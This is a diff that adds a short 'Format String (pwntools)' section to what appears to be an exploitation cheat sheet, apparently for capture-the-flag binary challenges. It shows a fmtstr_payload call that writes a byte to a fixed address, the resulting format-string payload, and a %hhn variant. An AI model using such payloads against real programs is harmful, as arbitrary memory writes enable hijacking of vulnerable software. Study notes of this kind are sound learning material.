@@ -330,3 +330,14 @@ binary          0x80490a2 cwde
 [heap]          0x8e76574 0x804b398
 [stack]         0xffa8007c 0x804b398
 [stack]         0xffa80080 0x804b398
+```
+### Format String (pwntools)
+```
+>>> from pwn import *
+>>> fmtstr_payload(71, {0x804b398: 0x38}, write_size='byte')
+b'%56c%74$naaa\x98\xb3\x04\x08'
+```
+_To prevent 00 00 in case write_size as above:_
+```py
+b'%56c%74$hhna\x98\xb3\x04\x08'
+```
